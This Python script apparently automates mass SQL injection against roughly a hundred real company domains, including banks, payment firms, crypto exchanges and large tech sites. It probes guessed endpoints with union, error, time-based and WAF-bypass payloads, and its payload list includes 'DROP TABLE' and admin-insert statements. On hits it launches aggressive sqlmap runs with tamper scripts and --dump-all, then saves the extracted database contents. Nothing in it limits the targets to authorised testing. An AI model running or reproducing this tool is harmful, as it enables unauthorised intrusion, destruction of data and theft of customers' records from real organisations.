#!/usr/bin/env python3

import subprocess
import json
import re
import time
import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedDatabaseExtractor:
    def __init__(self):
        # Extensive list from bug bounty programs
        self.domains = [
            # Financial/Fintech
            'acorns.com', 'coinbase.com', 'robinhood.com', 'chime.com', 'paypal.com',
            'stripe.com', 'square.com', 'venmo.com', 'zelle.com', 'mastercard.com',
            'visa.com', 'americanexpress.com', 'discover.com', 'capitalone.com',
            'wellsfargo.com', 'bankofamerica.com', 'chase.com', 'citi.com',
            'fidelity.com', 'schwab.com', 'etrade.com', 'tdameritrade.com',
            
            # Crypto/Blockchain
            'binance.com', 'kraken.com', 'gemini.com', 'blockchain.com',
            'crypto.com', 'ftx.com', 'bitfinex.com', 'bitstamp.net',
            
            # Technology
            'digitalocean.com', 'shopify.com', 'gitlab.com', 'github.com',
            'atlassian.com', 'slack.com', 'dropbox.com', 'spotify.com',
            'netflix.com', 'uber.com', 'airbnb.com', 'reddit.com',
            'twitter.com', 'facebook.com', 'linkedin.com', 'pinterest.com',
            'snapchat.com', 'discord.com', 'telegram.org', 'whatsapp.com',
            
            # E-commerce
            'amazon.com', 'ebay.com', 'etsy.com', 'walmart.com', 'target.com',
            'bestbuy.com', 'wayfair.com', 'overstock.com', 'newegg.com',
            'alibaba.com', 'aliexpress.com', 'wish.com', 'mercadolibre.com',
            
            # Enterprise
            'salesforce.com', 'microsoft.com', 'google.com', 'apple.com',
            'oracle.com', 'sap.com', 'adobe.com', 'zoom.us', 'okta.com',
            'workday.com', 'servicenow.com', 'splunk.com', 'tableau.com',
            
            # Media/Entertainment
            'youtube.com', 'twitch.tv', 'hulu.com', 'disney.com',
            'paramount.com', 'warner.com', 'sony.com', 'universal.com',
            'viacom.com', 'nbcuniversal.com', 'fox.com', 'cbs.com',
            
            # Travel
            'booking.com', 'expedia.com', 'hotels.com', 'marriott.com',
            'hilton.com', 'airbnb.com', 'delta.com', 'united.com',
            'southwest.com', 'american.com', 'jetblue.com', 'alaska.com',
            
            # Education/Job
            'indeed.com', 'glassdoor.com', 'monster.com', 'ziprecruiter.com',
            'coursera.org', 'udemy.com', 'edx.org', 'khanacademy.org',
            'blackboard.com', 'canvas.com', 'moodle.org', 'schoology.com'
        ]
        
        self.extracted_results = []
        
    def generate_test_urls(self, domain):
        """Generate comprehensive test URLs for a domain"""
        urls = set()
        base_url = f"https://{domain}"
        
        # Extensive endpoint list
        endpoints = [
            # Search endpoints
            '/search?q=test', '/search?query=test', '/search?term=test',
            '/api/search?q=test', '/api/v1/search?query=test', '/api/v2/search?q=test',
            '/rest/search?q=test', '/graphql?query=test', '/elastic/search?q=test',
            
            # User/Profile endpoints
            '/user?id=1', '/users?id=1', '/profile?id=1', '/profiles?id=1',
            '/account?id=1', '/accounts?id=1', '/member?id=1', '/members?id=1',
            '/customer?id=1', '/customers?id=1', '/client?id=1', '/clients?id=1',
            
            # Product/Item endpoints
            '/product?id=1', '/products?id=1', '/item?id=1', '/items?id=1',
            '/catalog?id=1', '/category?id=1', '/categories?id=1',
            
            # Content endpoints
            '/article?id=1', '/articles?id=1', '/post?id=1', '/posts?id=1',
            '/blog?id=1', '/news?id=1', '/page?id=1', '/pages?id=1',
            
            # API endpoints
            '/api/user?id=1', '/api/users?id=1', '/api/profile?id=1',
            '/api/v1/user?id=1', '/api/v2/users?id=1', '/api/v3/profile?id=1',
            '/rest/api/user?id=1', '/rest/api/users?id=1',
            
            # Admin/Management endpoints
            '/admin?id=1', '/admin/user?id=1', '/admin/users?id=1',
            '/manage?id=1', '/management?id=1', '/control?id=1',
            
            # Support/Help endpoints
            '/support?id=1', '/help?id=1', '/ticket?id=1', '/tickets?id=1',
            '/support/search?q=test', '/help/search?q=test',
            
            # Pagination endpoints
            '/page?page=1', '/list?page=1', '/browse?page=1',
            '/results?page=1', '/data?page=1', '/content?page=1',
            
            # Filter/Sort endpoints
            '/filter?type=1', '/sort?by=1', '/order?id=1',
            '/list?filter=1', '/browse?sort=1', '/view?order=1',
            
            # Dashboard/Portal endpoints
            '/dashboard?id=1', '/portal?id=1', '/console?id=1',
            '/panel?id=1', '/workspace?id=1', '/app?id=1'
        ]
        
        for endpoint in endpoints:
            urls.add(urljoin(base_url, endpoint))
        
        return list(urls)
    
    def test_advanced_sqli(self, url):
        """Advanced SQL injection testing with multiple payloads"""
        # Comprehensive payload list
        payloads = [
            # Basic payloads
            "'", "' OR '1'='1", "' OR 1=1--", "admin'--",
            
            # Union-based payloads
            "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL--", "' UNION SELECT @@version--",
            
            # Boolean-based payloads
            "' AND 1=1--", "' AND 1=2--", "' OR 'a'='a", "' OR 'a'='b",
            
            # Error-based payloads
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Time-based payloads
            "' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Stacked queries
            "'; DROP TABLE users--", "'; INSERT INTO users VALUES(1,'admin','pass')--",
            
            # Encoded payloads
            "%27%20OR%20%271%27%3D%271", "%27%20UNION%20SELECT%20NULL--",
            
            # WAF bypass payloads
            "' /*!OR*/ '1'='1", "' /**/OR/**/ '1'='1", "' OR/**/1=1--",
            "' OR 1=1#", "' OR 1=1/*", "' OR 1=1;%00",
            
            # Double encoding
            "%2527%2520OR%2520%25271%2527%253D%25271",
            
            # Case variations
            "' Or '1'='1", "' oR '1'='1", "' OR '1'='1'",
            
            # Comment variations
            "' OR 1=1-- ", "' OR 1=1#", "' OR 1=1/**/", "' OR 1=1;--"
        ]
        
        for payload in payloads:
            try:
                # Test different injection points
                test_urls = []
                
                if '=' in url:
                    # Replace parameter values
                    if '?id=' in url:
                        test_urls.append(url.replace('?id=1', f'?id={payload}'))
                    if '?q=' in url:
                        test_urls.append(url.replace('?q=test', f'?q={payload}'))
                    if '?query=' in url:
                        test_urls.append(url.replace('?query=test', f'?query={payload}'))
                    if '?page=' in url:
                        test_urls.append(url.replace('?page=1', f'?page={payload}'))
                    
                    # Append to existing parameters
                    test_urls.append(url + payload)
                
                for test_url in test_urls:
                    try:
                        response = requests.get(test_url, timeout=15, verify=False)
                        
                        # Check for various SQL error patterns
                        error_patterns = [
                            # MySQL errors
                            r'SQL syntax.*MySQL', r'Warning.*mysql_.*', r'valid MySQL result',
                            r'mysql_fetch_array\(\)', r'mysql_num_rows\(\)', r'mysql_query\(\)',
                            r'Unknown column.*in.*clause', r'Table.*doesn.*exist',
                            
                            # PostgreSQL errors
                            r'PostgreSQL.*ERROR', r'Warning.*pg_.*', r'valid PostgreSQL result',
                            r'pg_query\(\)', r'pg_exec\(\)', r'pg_fetch_array\(\)',
                            
                            # SQL Server errors
                            r'Microsoft.*ODBC.*SQL Server', r'SQLServer JDBC Driver',
                            r'SqlException', r'System.Data.SqlClient.SqlException',
                            
                            # Oracle errors
                            r'Oracle error', r'Oracle.*Driver', r'ORA-\d+',
                            r'oracle.jdbc', r'Oracle JDBC',
                            
                            # Generic SQL errors
                            r'SQL.*error', r'database.*error', r'syntax.*error',
                            r'Column count doesn.*match', r'Subquery returns more than 1 row',
                            r'Operand should contain 1 column', r'The used SELECT statements',
                            
                            # SQLite errors
                            r'sqlite3.OperationalError', r'SQLite.*error', r'sqlite_',
                            
                            # Access errors
                            r'Microsoft.*JET Database Engine', r'Access Database Engine',
                            
                            # Generic database errors
                            r'quoted string not properly terminated', r'unterminated quoted string',
                            r'unexpected end of SQL command', r'Warning.*supplied argument is not a valid'
                        ]
                        
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                return {
                                    'url': url,
                                    'payload': payload,
                                    'test_url': test_url,
                                    'vulnerable': True,
                                    'error_pattern': pattern,
                                    'response_snippet': response.text[:500]
                                }
                    except:
                        continue
                        
            except:
                continue
        
        return None
    
    def extract_database_aggressive(self, url):
        """Aggressive database extraction with all bypass techniques"""
        print(f"[+] Aggressive database extraction from {url}")
        
        # Multiple SQLMap configurations with different bypass techniques
        configs = [
            {
                'name': 'Max Aggression',
                'cmd': [
                    'sqlmap', '-u', url, '--batch', '--random-agent',
                    '--level=5', '--risk=3', '--timeout=120', '--retries=3',
                    '--technique=BEUSTQ', '--threads=10',
                    '--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords',
                    '--dbs', '--tables', '--columns', '--dump-all',
                    '--fresh-queries', '--flush-session'
                ]
            },
            {
                'name': 'WAF Bypass Heavy',
                'cmd': [
                    'sqlmap', '-u', url, '--batch', '--random-agent',
                    '--level=3', '--risk=2', '--timeout=90',
                    '--technique=B', '--threads=5',
                    '--tamper=space2comment,charencode,randomcase,between,greatest,modsecurityversioned',
                    '--dbs', '--tables', '--columns',
                    '--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"'
                ]
            },
            {
                'name': 'Union Exploitation',
                'cmd': [
                    'sqlmap', '-u', url, '--batch', '--random-agent',
                    '--level=2', '--risk=2', '--timeout=60',
                    '--technique=U', '--union-cols=1-50', '--union-char=NULL',
                    '--dbs', '--tables', '--columns',
                    '--tamper=charencode,randomcase,space2plus'
                ]
            },
            {
                'name': 'Error Based',
                'cmd': [
                    'sqlmap', '-u', url, '--batch', '--random-agent',
                    '--level=2', '--risk=2', '--timeout=60',
                    '--technique=E', '--dbs', '--tables', '--columns',
                    '--tamper=charencode,randomcase'
                ]
            },
            {
                'name': 'Time Based',
                'cmd': [
                    'sqlmap', '-u', url, '--batch', '--random-agent',
                    '--level=2', '--risk=2', '--timeout=120',
                    '--technique=T', '--time-sec=3', '--dbs', '--tables', '--columns',
                    '--tamper=charencode,randomcase,space2comment'
                ]
            }
        ]
        
        for config in configs:
            try:
                print(f"  [+] Trying {config['name']}...")
                result = subprocess.run(config['cmd'], capture_output=True, text=True, timeout=300)
                
                # Extract database information
                databases = self.extract_databases_comprehensive(result.stdout)
                tables = self.extract_tables_comprehensive(result.stdout)
                columns = self.extract_columns_comprehensive(result.stdout)
                
                if databases or tables or columns:
                    return {
                        'url': url,
                        'method': config['name'],
                        'databases': databases,
                        'tables': tables,
                        'columns': columns,
                        'raw_output': result.stdout[:2000],
                        'success': True
                    }
                    
            except subprocess.TimeoutExpired:
                print(f"    [-] Timeout for {config['name']}")
            except Exception as e:
                print(f"    [-] Error for {config['name']}: {e}")
        
        return None
    
    def extract_databases_comprehensive(self, output):
        """Comprehensive database extraction"""
        databases = []
        
        patterns = [
            r'available databases \[(\d+)\]:\s*\n(.*?)(?:\n\[|\nback-end|\Z)',
            r'current database:\s*[\'"]([^\'"]+)[\'"]',
            r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'retrieved:\s*[\'"]([^\'"]+)[\'"].*database',
            r'back-end DBMS:\s*.*database\s*[\'"]([^\'"]+)[\'"]',
            r'\[INFO\].*databases.*:\s*(.*?)(?:\n|\Z)',
            r'schema_name:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'DATABASE\(\):\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'db_name\(\):\s*([a-zA-Z_][a-zA-Z0-9_]*)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    if len(match) > 1:
                        db_text = match[1]
                        for db in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', db_text):
                            if len(db) > 1 and db.lower() not in ['null', 'none', 'error', 'warning', 'info']:
                                databases.append(db)
                    else:
                        if len(match[0]) > 1 and match[0].lower() not in ['null', 'none', 'error', 'warning', 'info']:
                            databases.append(match[0])
                else:
                    if len(match) > 1 and match.lower() not in ['null', 'none', 'error', 'warning', 'info']:
                        databases.append(match)
        
        return list(set(databases))
    
    def extract_tables_comprehensive(self, output):
        """Comprehensive table extraction"""
        tables = []
        
        patterns = [
            r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\n\[(\d+)\s*tables?\]:\s*\n(.*?)(?:\n\[|\nDatabase:|\Z)',
            r'Table:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'table_name:\s*[\'"]([^\'"]+)[\'"]',
            r'Tables_in_\w+:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'retrieved:\s*[\'"]([^\'"]+)[\'"].*table',
            r'\[INFO\].*tables.*:\s*(.*?)(?:\n|\Z)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    if len(match) > 2:
                        table_text = match[2]
                        for table in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', table_text):
                            if len(table) > 1 and table.lower() not in ['null', 'none', 'error', 'warning', 'info']:
                                tables.append(table)
                    elif len(match) > 0:
                        if len(match[0]) > 1 and match[0].lower() not in ['null', 'none', 'error', 'warning', 'info']:
                            tables.append(match[0])
                else:
                    if len(match) > 1 and match.lower() not in ['null', 'none', 'error', 'warning', 'info']:
                        tables.append(match)
        
        return list(set(tables))
    
    def extract_columns_comprehensive(self, output):
        """Comprehensive column extraction"""
        columns = []
        
        patterns = [
            r'Table:\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\n\[(\d+)\s*columns?\]:\s*\n(.*?)(?:\n\[|\nTable:|\Z)',
            r'Column:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'column_name:\s*[\'"]([^\'"]+)[\'"]',
            r'Field:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'retrieved:\s*[\'"]([^\'"]+)[\'"].*column',
            r'\[INFO\].*columns.*:\s*(.*?)(?:\n|\Z)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    if len(match) > 2:
                        col_text = match[2]
                        for col in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', col_text):
                            if len(col) > 1 and col.lower() not in ['null', 'none', 'error', 'warning', 'info']:
                                columns.append(col)
                    elif len(match) > 0:
                        if len(match[0]) > 1 and match[0].lower() not in ['null', 'none', 'error', 'warning', 'info']:
                            columns.append(match[0])
                else:
                    if len(match) > 1 and match.lower() not in ['null', 'none', 'error', 'warning', 'info']:
                        columns.append(match)
        
        return list(set(columns))
    
    def run_comprehensive_extraction(self):
        """Run comprehensive database extraction until we get 5 successful extractions"""
        print("=== COMPREHENSIVE DATABASE EXTRACTION ===")
        print(f"Testing {len(self.domains)} domains until 5 successful database extractions...")
        
        successful_extractions = 0
        tested_domains = 0
        
        for domain in self.domains:
            if successful_extractions >= 5:
                break
                
            tested_domains += 1
            print(f"\n[{tested_domains}/{len(self.domains)}] Testing domain: {domain}")
            
            # Generate test URLs
            test_urls = self.generate_test_urls(domain)
            print(f"  [+] Generated {len(test_urls)} test URLs")
            
            # Test for SQL injection
            vulnerable_urls = []
            for url in test_urls[:10]:  # Test first 10 URLs per domain
                result = self.test_advanced_sqli(url)
                if result:
                    vulnerable_urls.append(url)
                    print(f"  [!] Found vulnerable URL: {url}")
                    
                    if len(vulnerable_urls) >= 3:  # Max 3 vulnerable URLs per domain
                        break
            
            # Extract database info from vulnerable URLs
            for url in vulnerable_urls:
                if successful_extractions >= 5:
                    break
                    
                print(f"\n  [+] Extracting database info from: {url}")
                extraction_result = self.extract_database_aggressive(url)
                
                if extraction_result and (extraction_result.get('databases') or 
                                        extraction_result.get('tables') or 
                                        extraction_result.get('columns')):
                    self.extracted_results.append(extraction_result)
                    successful_extractions += 1
                    
                    print(f"  [!] SUCCESS #{successful_extractions}: Database extraction successful!")
                    print(f"      Databases: {len(extraction_result.get('databases', []))}")
                    print(f"      Tables: {len(extraction_result.get('tables', []))}")
                    print(f"      Columns: {len(extraction_result.get('columns', []))}")
        
        # Save results
        with open('comprehensive_extraction_results.json', 'w') as f:
            json.dump(self.extracted_results, f, indent=2)
        
        print(f"\n=== EXTRACTION COMPLETE ===")
        print(f"Successfully extracted database info from {len(self.extracted_results)} URLs")
        
        return self.extracted_results

if __name__ == "__main__":
    extractor = AdvancedDatabaseExtractor()
    results = extractor.run_comprehensive_extraction()
    
    print("\n=== FINAL RESULTS ===")
    for i, result in enumerate(results, 1):
        print(f"\n{i}. URL: {result['url']}")
        print(f"   Method: {result['method']}")
        print(f"   Databases: {result.get('databases', [])}")
        print(f"   Tables: {result.get('tables', [])}")
        print(f"   Columns: {result.get('columns', [])}")
